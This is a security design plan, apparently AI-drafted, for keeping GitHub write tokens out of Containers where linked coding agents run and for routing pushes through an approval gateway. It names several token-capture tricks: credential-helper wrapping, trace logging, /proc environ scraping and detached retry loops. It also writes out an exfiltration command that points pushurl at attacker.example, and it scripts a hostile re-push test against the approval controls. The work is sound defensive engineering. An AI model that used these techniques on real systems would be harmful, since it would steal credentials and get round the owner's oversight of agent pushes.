# Plan: SPI-992 and SPI-1040 — link-started pushes without a write token in the Container, and D1 approvals for the CLI agents

**Status:** draft for owner review. **Tickets:** SPI-992 (high), SPI-1040; related SPI-990, SPI-1041.
**Reading list covered:** AGENTS.md, GLOSSARY.md, docs/parity.md, docs/upstream-fragility.md, ADRs 0010/0013/0015/0016/0025, step-3 (plan and report), step-3plus, step-4a (plan and report), step-4b (plan and report).
**Gap:** the `linear` CLI was not run (no shell), so the ticket text is taken from the brief and from where the repo's docs quote the tickets: ADR-0013's step-3 refinement, step-4a F8, step-4b F10, and plan.md's deferred item "GitHub tokens through the intercept".

## 1. Problem, as the code has it today

- **Where the token goes.** The git credential helper (`CREDENTIAL_HELPER`, `apps/agents/src/workspace/WorkspaceDO.ts:198-205`) asks `GET http://computer.internal/t3flare/git-credential?op=…&cmd=…`.
  - That request reaches `WorkspaceDO.#credential` (`:1507-1541`), which applies `credentialDecision` (`workspace/linkedPush.ts:27-35`).
  - While linked work is active: a fetch gets a read-only token, a push asks the linked Session (`SessionDO.approveGitPush`, `session/SessionDO.ts:258-297`).
  - An approved push then receives **the Workspace's write token on stdout, inside the Container**.
  - So a hostile linked agent can wrap the helper, set `GIT_TRACE_CURL`, or read `/proc/*/environ`, and reuse the token for up to an hour. ADR-0013 records this as an accepted residual risk.
- **Other places a write token sits in the Container:**
  1. t3's own push, fetch and pull. The router mints a write token for every network git command (`needsRemoteToken`, `apps/environment/src/agents/gitRoutes.ts:84-90`). It puts it in that command's `T3FLARE_GIT_TOKEN` (`agents/processRouter.ts:205-215`), where any process running at the same time can read it (`/proc/<pid>/environ`; the agent runs as root, ADR-0016's 4b refinement).
  2. Clones and worktree clones (`WorkspaceDO.clone` `:1001-1031`, `worktreeClone` `:1043-1060`) get a write token the same way.
  3. With no linked work active, the helper gives *any* caller the write token (`credentialDecision` → `token`). A linked thread can plant a wrapping credential helper in the shared checkout's `.git/config`, or leave a detached process behind. Either one collects the token from the owner's next push.
  4. **The helper never checks the host.** It prints the token for any `get`, whatever `host=` git sends on stdin. `git -c remote.origin.pushurl=https://attacker.example/x push` therefore sends a token to the attacker. During linked work it sends the write token after the approval, because the card shows only the command line. This is a new finding, and the plan fixes it in M1.
- **SPI-1040.** A linked CLI thread holds linked work under `cli:<thread>` while its process lives (`WorkspaceDO.ts:348-355`, `ProcessHost` `linkedWork`). `#credential` refuses its pushes (`:1513-1518`) because nothing yet raises an approval on a thread that t3's own adapters run (step-4a F8, R13; step-4b §5.6, F10).

## 2. Platform facts (checked 2026-11-12 against current Cloudflare docs and computer 0.9.0)

From developers.cloudflare.com, "Handle outbound traffic" and "Durable Object Container API" (last updated 2026-11-09):
- **Outbound handlers can hold the credential.** A `WorkerEntrypoint` registered as an outbound intercept can keep a secret and add it to requests; the docs' own example injects GitHub auth. The handler must check `url.protocol` and `url.hostname`: the URL comes from the Host header, which the Container controls. Use `redirect: "manual"` so the credential never follows a redirect.
- **Plain HTTP needs no CA.** `interceptOutboundHttp(host)` can be registered before or after `start()`, and the hostname need not exist in public DNS. Requests to the handler stay on the same machine.
- **HTTPS interception needs a CA.** It needs `interceptOutboundHttps(host)` registered **before `start()`**, so the ephemeral CA exists at `/etc/cloudflare/certs/cloudflare-containers-ca.crt`. The Container must then trust that CA, and runtimes with their own bundle need it set by hand.
  - The image's git is `conda:git` 2.56.0 (`apps/sandbox-image/image/mise.toml`), which reads conda's own CA bundle and `$PREFIX/etc/gitconfig`, not `/etc/...`.
- **Handlers can be swapped.** Registering a target again replaces its handler and props, and open connections keep working. An intercept lasts until the Container stops.
- **Limits:**
  - 128 intercept entries per Container.
  - **Each request body sent through an outbound handler is capped at 100 MiB.** Chunked encoding does not get around it, and larger bodies get 413.
- **computer 0.9.0 already intercepts `computer.internal` (HTTP)** with our `WorkspaceProxy` and props `{binding, id, name}` (`dist/backends/container/index.js:239, 799-801`). This happens after `start()`, under `egress: {mode:"direct"}` (`WorkspaceDO.ts:257-258`).
  - Our subclass `apps/agents/src/workspaceProxy.ts` handles `/t3flare/*` today, but **only as GET without a body**. It rebuilds the request as `{method:"GET"}`.
  - `#budgeted` (`WorkspaceDO.ts:551-575`) wraps `start`/`restart`, so an HTTPS intercept could be registered there before `api.start(spec)` if that option is chosen.

**Verdict:** Containers' outbound interception can do this. The cheapest route needs no TLS interception at all: send git's *push* URL to the existing plain-HTTP egress host with `pushInsteadOf`, and let the handler add `Authorization` before it calls `https://github.com`.

## 3. Design

### 3.1 The invariant (recommended, OD-2)

**No GitHub token that can write ever enters a Container.**
- Every token handed into a Container is read-only (`contents: read`, `metadata: read`), and the helper hands one only for `protocol=https host=github.com`.
- Write happens only in the **push gateway**: code in the agents Worker that the Container reaches through `computer.internal`. The gateway adds the write token per request, after a policy decision on the exact ref updates.

### 3.2 The push gateway

- **Routing.** Each Workspace repo gets `url."http://computer.internal/t3flare/git/".pushInsteadOf = "https://github.com/"` in its `.git/config`.
  - It is set at clone and at worktree clone, and set again at every Container start. That covers existing Workspaces and an agent that removed it.
  - Only pushes are rerouted. Fetches stay direct, with the read-only token.
  - An agent that removes the rewrite and pushes straight to github.com has no write credential, so its push fails closed.
- **Entry point.** `WorkspaceProxy.fetch` gets a new route, `/t3flare/git/<owner>/<repo>(.git)/…`, that streams the method, headers and body.
  - It accepts only `GET …/info/refs?service=git-receive-pack` and `POST …/git-receive-pack`. Everything else gets 404.
  - `<owner>/<repo>` must equal the Workspace registry's GitHub repo, case-insensitively. The upstream URL is built from the registry, never from `Host`.
  - The Container's `Authorization` is dropped, and the upstream call uses `redirect: "manual"`.
- **Decision per request:**
  - **Ref advertisement (GET info/refs).** The gateway adds the token. This has no side effects, and GitHub needs auth for the receive-pack advertisement.
  - **POST git-receive-pack.** The gateway reads the pkt-line command list up to the first flush (gunzipping a copy if `Content-Encoding: gzip`): `<old> <new> <ref>` per line, plus capabilities and push options.
    - An **empty list** (git's `probe_rpc` body `0000`) is forwarded with auth. It updates nothing.
    - Otherwise the gateway calls `WorkspaceDO.authorizePush({ updates, pushOptions })` over RPC and gets back `{ token } | { refused, reason }`. It then forwards the buffered prefix plus the rest of the body stream to GitHub, so the body never goes through the DO.
- **`authorizePush` policy** (`linkedPush.ts`, renamed `pushDecision`):

| State | Decision |
|---|---|
| Outstanding **expectation** matches every update exactly (t3's own push, §3.4) | allow, expectation consumed |
| No linked work active (OD-4 sets how long it lasts) | allow (today's behaviour, now without the token in the Container) |
| Linked work active, latest is a Session | ask that Session: `SessionDO.approveGitPush({ workspace, updates })` |
| Linked work active, latest is `cli:<thread>` | ask the Environment: `EnvironmentDO.approveLinkedPush({ thread, workspace, updates })` (SPI-1040, §3.5) |
| Push certificate, unknown capability needed for safety, or > 64 updates | refuse with a reason |

  - The approval goes back to the waiting request inline. **No grant is stored.** Each POST gets its own card, an approval covers only that request's exact command list, and "accept for the session" counts once (as `permissions.ts:49` already does).
- **Write token.** It is minted through `EnvironmentDO.workspaceToken(id, { purpose: "push" })` and cached in the DO's memory until 5 minutes before it expires. It is never logged, and it is never returned to the Container on any path.
- **Declined pushes.** If the client advertised `report-status` (and side-band), the gateway answers 200 with `unpack ok` plus `ng <ref> declined by the owner (t3flare)`, so git prints `! [remote rejected] … (declined by the owner)`. Otherwise it answers 403 with a one-line reason.

### 3.3 The credential helper and the router (read-only everywhere)

- **`CREDENTIAL_HELPER`** reads git's stdin attributes. It answers only `protocol=https` with `host=github.com`, and asks the DO for a read-only token.
  - The `/proc` ancestor parsing (`op`, `cmd`), which the agent could spoof, goes away.
  - It keeps one stderr hint: "pushes go through t3flare's push gateway (`pushInsteadOf`)". This replaces the old cmd-line context.
- **`WorkspaceDO.#credential`** always returns a read-only token. The `cli:` refusal branch (`:1513-1518`) moves into the gateway policy as "ask".
- **`containerToken`** (`processRouter.ts:159-176`): Container callers get `CONTAINER_READ_PERMISSIONS` only. `CONTAINER_GITHUB_PERMISSIONS` and `CONTAINER_WORKFLOWS_PERMISSIONS` are minted only for the gateway (`packages/github-app/src/permissions.ts`, with the comments rewritten).
- **The router** (`gitRoutes.ts:84-90` `needsRemoteToken`, split into `fetchLike` and `push`):
  - fetch, pull, ls-remote and submodule update get a read-only `T3FLARE_GIT_TOKEN`;
  - clone and worktree clone get read-only too;
  - push gets **no token** and goes through the gateway (§3.4).

### 3.4 t3's own push during linked work (OD-5)

- **Expectations.** Before running t3's `git push …`, the router resolves each refspec's source to a commit through the Workspace's git RPC (`rev-parse`). It then registers `WorkspaceDO.expectPush({ updates: [{ ref, new }], ttlMs: 120_000 })`.
  - The forms handled are t3's: `-u <remote> <branch>`, `<remote> HEAD:refs/heads/x`, `<remote> <src>:<dst>` and `--delete`.
  - The gateway allows a POST only if every update equals an expectation. Each expectation is used once.
  - Expectations are not secrets. A linked process that races one can push only exactly what the owner clicked.
- **Unparseable refspecs.** With linked work active, t3's push fails with a clear message. With no linked work it is allowed anyway (row 2 of the policy table).

### 3.5 SPI-1040: the approval on a CLI thread

- **Asking.** `EnvironmentDO.approveLinkedPush` finds the live `CliSession` for the thread in a new registry, `provider/cli/linkedPushAsk.ts`. The wrapper fills it on `openSession` for linked sessions and clears it in the finalizer.
  - No session, no live turn, or no answer in 10 minutes (`PUSH_APPROVAL_MS`) means the push is refused.
- **Raising the card.** The wrapper (`provider/cli/wrapper.ts`) merges an injected stream into `runtime.events`:
  - `runtime_request.updated` with kind `command`, status `pending` and `responseCapability: live`, plus `node.updated` (`approval_request`, waiting) and `turn_item.updated` (title "Allow git push?", the prompt listing the updates and the link's label).
  - This is the same shape the Durable differ emits (`provider/differ.ts:386-445`).
  - The ids are `runtime-request:<driver>:t3flare-push:<uuid>`.
  - The turn's `runId`, `providerTurnId`, `rootNodeId`, `providerThreadId` and `providerSessionId`, and the next free item ordinal, are tracked from the adapter's own events for the active turn.
- **Answering.** The wrapper's `respondToRuntimeRequest` catches these ids:
  - Any accept means approved; any other decision means declined.
  - The wrapper then emits the resolved or cancelled events, and never passes the response on to t3's adapter.
  - An id it doesn't know (a stale card after a restart) is closed as cancelled, never sent on.
- **What is unchanged:**
  - The ACP card offers no "for the session" (4b).
  - `t3_pending_request` still cannot answer approvals (step-3 F7); this is re-checked for injected requests.
  - The approval publishes as "Approval needed" through T3 Connect, so the owner's phone hears it (ADR-0025, `connectPhases.test.ts`).
- **Durable path.** `SessionDO.approveGitPush` takes `updates` instead of `op`/`command`. The card summary becomes, for example, "push refs/heads/x a1b2c3d → e4f5a6b" (one line per update; force or delete marked).

### 3.6 Considered and not recommended

- **HTTPS intercept on `github.com`** (OD-1, alternative). It is transparent to every tool. But every github.com HTTPS byte would run through the Worker, and the ephemeral CA must be trusted by conda git, Node, Bun, Python and Codex's Rust stack. HTTPS intercepts must also be registered in `#budgeted` before `start`. It belongs with SPI-990 and SPI-1041 (the egress allowlist), not with this fix.
- **A short-lived grant handed to the helper** (the step-3 shape with a 1-use token): the token is still in the Container.
- **Refusing all linked pushes** (today's CLI fallback): stricter than D1, and it leaves the step-3 Durable residual open.

## 4. Milestones and exit evidence

Stage: throwaway `spi992`, added to `STAGES` in `apps/environment/scripts/stage.ts`. Fixture: `ian-pascoe/t3flare-fixture`, branches `spi992/*`, main restored as in `peer-m3.ts`. Prod is never deployed, run against or linked. Evidence goes in `docs/steps/spi-992/`.

### M0. Probes (stage + local), with stop gates

| # | Probe | Gate / fallback |
|---|---|---|
| P1 | Spike `WorkspaceProxy` route: conda git 2.56 `git push` via `pushInsteadOf` → `http://computer.internal/t3flare/git/…` → handler → `https://github.com` with a streamed body (`duplex: "half"`) | Fails → stop and report; HTTPS-intercept option (OD-1) |
| P2 | Hold the receive-pack POST 10 min before answering (approval wait); does git, the intercept or the DO RPC cut it? | Cut → stream side-band keepalives ("remote: t3flare: waiting for the owner's approval") with a 200 started early, translating GitHub's answer or the decline into side-band |
| P3 | Packs of 90 MiB and 110 MiB through the handler | 110 MiB → 413, as documented: record it; the gateway answers with a named message (R2) |
| P4 | Record the request shapes from the image's git: gzip on receive-pack, chunked above `http.postBuffer`, `probe_rpc`, `Expect`, push options, `--atomic`, `--signed` | Fixtures for M1's parser tests |
| P5 | t3 accepts a wrapper-injected approval on a live Codex turn and an ACP turn: shown, answered with `runtime-request.respond`, the turn goes on, the projection is clean; F7 holds; Environment restart while it waits | Rejected → SPI-1040 keeps the refusal fallback (OD-7), SPI-992 goes ahead |

Exit: `m0-*.json`. P5 is a Node test with the wrapper over the scripted ACP agent (`test/acpAdapter.test.ts` style) plus one stage run.

### M1. The gateway and read-only Containers (SPI-992 core)

Build §3.2–3.4 apart from the approval UI change.

- **Unit tests:**
  - `apps/agents/test/pushGateway.test.ts`: pkt-line parse with P4 fixtures; policy table; repo, path and host checks; Authorization dropped; manual redirects; decline report.
  - `credentialHelper.test.ts`: the helper script in a shell, given host and protocol variants.
  - The `linkedPush.test.ts` update.
  - Router tests for the refspec → expectation forms.
- **Stage (`m1-gateway.json`):**
  - owner Durable thread `git push` lands through the gateway, and no `ghs_` token with write appears in the Container's leak scan;
  - t3's "Commit & push" lands through an expectation;
  - a fetch works with the read token;
  - `git -c remote.origin.pushurl=https://github.com/<fixture>.git push` (gateway bypassed) is refused;
  - a `pushurl` to a foreign host gets no token (helper log shows "refused host");
  - an old Workspace gets `pushInsteadOf` at its next Container start.

### M2. D1 for Durable agents through the gateway, and the hostile test (closes SPI-992)

- **The re-run.** `SessionDO.approveGitPush` with updates, then the differ text. Re-run step-3's push case (`peer-m3.ts push`, extended):
  - the fetch asks nothing;
  - the declined push leaves the remote unchanged;
  - the approved push lands once;
  - the next push asks again, after "accept for session".
- **Hostile "capture and re-push" test** (`scripts/linked-push.ts hostile`, `m2-hostile-durable.json`):
  - **Setup.** A linked thread (link at auto-accept-edits, scripted laptop, `scripts/lib/peer.ts`) runs one prepared script from the fixture. The model only runs one command, so the test is deterministic. Its bash approvals are answered by the harness as the owner's client.
  - **Before the push, capture everything:**
    - `GIT_TRACE=1 GIT_TRACE_CURL=1 GIT_TRACE_PACKET=1`;
    - a wrapping `credential.helper` (global and repo) that logs its output;
    - a `git` shim first on `PATH`;
    - a loop dumping every `/proc/*/environ` and `cmdline` every 50 ms;
    - `http.proxy` pointed at a local logging proxy that records every full request and response to `computer.internal` (headers and bodies).
  - **The approved push.** `git push origin HEAD:refs/heads/spi992/a-<n>` → card → harness approves → lands.
  - **Re-push attempts, all expected to fail without a new approval:**
    1. replay the recorded POST bytes to the gateway → a **new** card appears; the harness declines → refused;
    2. every captured string (any `ghs_…`, Basic or Bearer value) tried as a password against `https://github.com/<fixture>.git` (direct) to push `spi992/b-<n>` → 401/403;
    3. the same strings against the REST API (`PUT /repos/…/contents/…`, `POST /git/refs`) → 401/403/404;
    4. `git push` through the gateway again → card → declined → refused;
    5. `t3_pending_request respond` on the card from the link → refused (F7).
  - **Assertions:**
    - via the GitHub API from the harness, only `spi992/a-<n>` exists at the approved commit, and main is unchanged;
    - every `ghs_` token found in the captures fails a write;
    - the Container leak scan finds no write token (the gateway's write token is added to the scan patterns as a value hash; it must never match).
- **Persistence variant** (`m2-hostile-persist.json`). A stage-only `LINKED_WORK_MS` override (behind `T3FLARE_FAULTS`) set to 3 minutes. The script leaves a detached `setsid` loop that tries to push every 30 seconds, plus a planted wrapping helper. After the window lapses:
  - under OD-4's recommendation the Container is stopped and the loop dies, with no ref created;
  - the owner's next push lands, and the planted helper logged only read tokens.
- **Exit:** both JSON files pass. ADR-0013's step-3 residual is marked closed.

### M3. D1 for the CLI agents (SPI-1040)

- **Build.** §3.5: `EnvironmentDO.approveLinkedPush`, `provider/cli/linkedPushAsk.ts`, and the wrapper's injection and answer path. `WorkspaceDO` routes `cli:` asks to it.
- **Tests:**
  - wrapper unit tests over the scripted Codex and ACP events: inject, answer, stale id, restart, ordinals;
  - `connectPhases` for the injected card.
- **Stage (`m3-linked-push-<cli>.json`).** For Codex, Pi, Claude and OpenCode, each as a linked task:
  - the push asks on that CLI thread; approve lands, decline doesn't; the next push asks again;
  - the M2 hostile script runs under each CLI (its bash tool), with the same assertions.
  - Pi's shell holds its key nonce (ADR-0016 residual); this does not touch GitHub.
- **Exit:** four passing files. The `cli:` refusal is gone. `acceptance --peer` gains `--linked-push` (one Durable and one CLI case), and the bump job runs it.

### M4. Documents and wrap-up

- **ADR-0013 refinement:** the push gateway; Container tokens read-only; the residual closed; the helper's host check; t3's push expectations; the 100 MiB cap.
- **ADR-0016:** one line ("GitHub: no token with write in a Container").
- **ADR-0015 refinement:** D1 for CLI agents.
- **GLOSSARY:**
  - **Container token** redefined as read-only;
  - new **Push gateway** ("The agents Worker's handler at `computer.internal` through which every `git push` from a Container reaches GitHub, adding the write token per request after the push policy"; _Avoid_: git proxy, credential intercept);
  - **Link fence** text updated.
- **parity.md:** the Git row notes the push gateway and the 100 MiB per-push cap.
- **upstream-fragility:** U37, U38 (§7).
- **Report:** `docs/steps/spi-992.md`; `bun run check`; stage destroyed; tickets closed with evidence links.

Order: M0 → M1 → M2 (SPI-992 can land here) → M3 (SPI-1040) → M4. M3's code depends on M1's policy hook only.

## 5. Risks

| # | Risk | Mitigation / where caught |
|---|---|---|
| R1 | Intercepted POST held during the approval is cut by an idle timeout | P2; side-band keepalive fallback |
| R2 | **100 MiB per request body** through outbound handlers: a push whose pack is larger fails (413) for *every* push under OD-2 (big first pushes, vendored binaries) | Named error; owner can ask Cloudflare to raise it; OD-2's alternative scope keeps unlinked pushes on the old path |
| R3 | t3 rejects or mis-renders injected runtime requests (ordinals, snapshot `runtimeRequests`, restart leaves a stale card) | P5; wrapper closes unknown ids; fallback OD-7 |
| R4 | git protocol variants: gzip request, chunked, `probe_rpc`, push options, atomic, signed pushes | P4 fixtures; unknown → refuse with reason |
| R5 | Git LFS uploads are not proxied (batch API plus upload hrefs) | Out of scope: linked LFS pushes fail closed; documented |
| R6 | Attribution is per Workspace, not per process: an owner thread's push during a linked window asks on the linked thread (as today); a linked process is indistinguishable from an owner process | Kept from step 3; OD-4 narrows the detached-process case |
| R7 | The Container controls `Host` and paths | Upstream URL from the registry only; path allowlist; `redirect: "manual"` |
| R8 | Workers outbound `fetch` with a streamed request body to github.com (duplex, chunked) | P1 |
| R9 | `pushInsteadOf` removed or overridden by the agent or the repo | Fails closed (no write credential); set again at each Container start |
| R10 | A token mint per push adds latency, and GitHub rate limits apply | Write token cached in DO memory until 5 min before expiry |
| R11 | Environment or Workspace DO restarts mid-push | The push fails as an error; no token escapes; the card is cancelled (R3) |
| R12 | Losing write in the Container breaks an owner agent's ad hoc `gh`/API writes with a fished-out token | Called out in OD-2; t3's PR features (Environment token) are unaffected |
| R13 | The approval UX gets less context (updates, not the shell command) | The card lists ref, old → new, force or delete, and the link label; this is what GitHub will apply, not what the agent claims |

## 6. Owner decisions (with recommendations)

1. **OD-1 How git reaches the gateway.**
   - **Recommend:** `pushInsteadOf` to the plain-HTTP egress host `computer.internal`. No CA, only pushes rerouted, computer's existing intercept.
   - Alternative: an HTTPS intercept on `github.com` (CA trust in conda git, Node and others; every github.com byte through the Worker). Leave that to SPI-990 and SPI-1041.
2. **OD-2 Scope of "no write token in the Container."**
   - **Recommend: never, in any Container.** All pushes go through the gateway, and every Container token is read-only. This closes the planted-helper and owner-push capture paths that a "linked-only" rule leaves open.
   - Costs: R2 (100 MiB per push) and R12.
   - Alternative: the gateway only while linked work is active; otherwise today's helper write token.
3. **OD-3 What an approval binds to.**
   - **Recommend:** the exact ref-update list in the receive-pack request, approved inline once per request, with no stored grant. The card shows updates, not the command line.
   - The alternative (approve the helper's command line, as step 3 does) can be spoofed.
4. **OD-4 How long linked taint lasts.**
   - **Recommend:** until the Container stops. When the 30-minute window lapses and the Container is quiet (no terminal, CLI or command running), the Workspace DO stops it (as `#restartForSubmodules` does). This kills detached linked processes and closes step 3's second residual.
   - Alternative: keep 30 minutes from the last linked command (the residual stays).
5. **OD-5 t3's own push while linked work is active.**
   - **Recommend:** a bound expectation `{ref, new}`, used once, 2 minutes, not secret.
   - Alternatives: ask on the linked thread (odd for the owner's own click), or refuse.
6. **OD-6 Full-access links.** The glossary says a full-access link is not fenced, but the code gates every linked thread (`LinkedWork.access` is not read).
   - **Recommend:** keep gating all linked work (stricter) and fix the glossary sentence for pushes.
7. **OD-7 If P5 fails (t3 won't take an injected request).**
   - **Recommend:** keep refusing linked CLI pushes (today's behaviour), ship SPI-992 alone, and file an upstream ask for a provider-agnostic "server-side approval" request.
8. **OD-8 Stage and fixture use.**
   - **Recommend:** stage `spi992`; `t3flare-fixture` branches `spi992/*`; main restored with the owner's `gh` as `peer-m3.ts` does; no desktop demo needed (optional, agent-driven as in step 3 and 4b, with your prior OK).

## 7. t3code submodule impact (ADR-0001: Layer > Shadow > Patch; the submodule stays as pinned)

- **The tree is not touched.** Everything is our code or a Layer:
  - our DOs and `WorkspaceProxy` (agents Worker);
  - the process router (our `ChildProcessSpawner`);
  - the CLI wrapper around t3's `makeCodexAdapterV2`, `makePiAdapterV2` and `makeAcpAdapterV2`;
  - the Durable differ.
- **No new Shadow and no new Patch.** Counts stay at **Shadows 2, Patches 3**. No Build shim.
- **New reliance on t3 internals** (fragility entries):
  - **U37 — injected runtime requests in the CLI wrapper.** Relies on `ProviderAdapterV2` events `runtime_request.updated`, `node.updated` and `turn_item.updated` with an `approval_request` item (`t3code/packages/provider-core/src/server/ProviderAdapter.ts:167-171`), `respondToRuntimeRequest` (`:702`), and t3 showing and routing a request the native agent never sent.
    - Breaks when the schema changes, when t3 validates requests against adapter state, or when ordinals or snapshot reconciliation change.
    - Detection: typecheck (schema), wrapper unit tests, `acceptance --peer --linked-push`.
  - **U38 — t3's push argv for expectations.** The refspec forms t3's git layer sends (`-u <remote> <branch>`, `HEAD:refs/heads/x`, `<src>:<dst>`, `--delete`; see `t3code/apps/server/src/git/GitManager.test.ts`).
    - Breaks when t3 pushes another form.
    - Detection: router unit tests, and `acceptance` "Commit & push" during linked work. An unparsed form is refused with a named message, so the failure is loud, not unsafe.
  - The `gh` emulation (U15) and the `git` routes (U18) are unchanged.

## 8. Files and seams

| File | Change |
|---|---|
| `apps/agents/src/workspaceProxy.ts` | `/t3flare/git/…` route: streams method, body and headers; gateway entry; existing credential and model-key routes unchanged |
| `apps/agents/src/workspace/pushGateway.ts` (new) | pkt-line parse (gzip copy), path and repo checks, upstream request build, decline report |
| `apps/agents/src/workspace/linkedPush.ts` | `credentialDecision` → read-only always; new `pushDecision` (expectation, no linked work, ask Session, ask CLI) |
| `apps/agents/src/workspace/WorkspaceDO.ts` | `CREDENTIAL_HELPER` (`:198-205`) host check, read-only; `#credential` (`:1507-1541`); new RPCs `authorizePush`, `expectPush`; write-token cache; `pushInsteadOf` in `clone` (`:1001-1031`), `ensureCredentialHelper` (`:1571`), and at Container start; OD-4 stop-on-lapse near the alarm (`~:1450`); `#tokenPatterns` also hashes the gateway's write token |
| `apps/agents/src/workspace/worktreeScripts.ts` | `pushInsteadOf` on worktree clones (`:22-24`) |
| `apps/agents/src/session/SessionDO.ts` | `approveGitPush` (`:258-297`) takes `updates`; card text |
| `apps/environment/src/environmentDO.ts` | `workspaceToken` (`:270`) gains `purpose: "push"` (write, gateway only); new `approveLinkedPush` |
| `apps/environment/src/agents/processRouter.ts` | `containerToken` (`:159`) read-only for Container callers; `git` (`:205-215`) push → expectation, no token |
| `apps/environment/src/agents/gitRoutes.ts` | `needsRemoteToken` (`:84-90`) split; refspec → expected updates |
| `apps/environment/src/provider/cli/wrapper.ts` | turn tracking, injected event stream, `respondToRuntimeRequest` catch |
| `apps/environment/src/provider/cli/linkedPushAsk.ts` (new) | thread → asker registry |
| `apps/environment/src/provider/differ.ts` | git-push card text (`:336-360`) |
| `packages/github-app/src/permissions.ts` | comments and names: Container token is read; push permissions are the gateway's |
| `packages/workspace-client/src/index.ts` | RPC types |
| `apps/environment/scripts/linked-push.ts` (new), `lib/peerAcceptance.ts`, `acceptance.ts`, `stage.ts`, `scripts/bump.ts` | hostile harness, `--linked-push`, stage `spi992`, bump flags |
| Tests | `apps/agents/test/pushGateway.test.ts`, `credentialHelper.test.ts`, `linkedPush.test.ts`; `apps/environment/test/cliLinkedPush.test.ts`, `gitRoutes` tests, `connectPhases.test.ts` |
| Docs | ADR-0013/0015/0016, GLOSSARY, parity.md, upstream-fragility U37/U38, `docs/steps/spi-992.md` |

The image needs nothing under OD-1's recommendation. Under the HTTPS-intercept alternative: the Dockerfile entrypoint trusts the CA, conda git's `http.sslCAInfo` is set, and intercepts are registered in `#budgeted` before `start`.

---

**Points that need you before or during the build:**
- **New finding.** The current credential helper hands a token to any host git asks about. Today it can send the write token to an attacker's `pushurl`, including right after an approved linked push. M1's host check fixes it; it is worth landing early even if the rest waits.
- **Biggest trade-off is OD-2.** Keeping write tokens out of every Container (my recommendation) also blocks the planted-helper and owner-push capture paths. The cost is Cloudflare's 100 MiB cap on each request body through an outbound handler, which would then apply to every push, not just linked ones.
- **SPI-1040 depends on probe P5:** whether t3 accepts an approval that our wrapper injects on a CLI thread. If it doesn't, the recommendation (OD-7) is to keep refusing linked CLI pushes and ship SPI-992 alone.
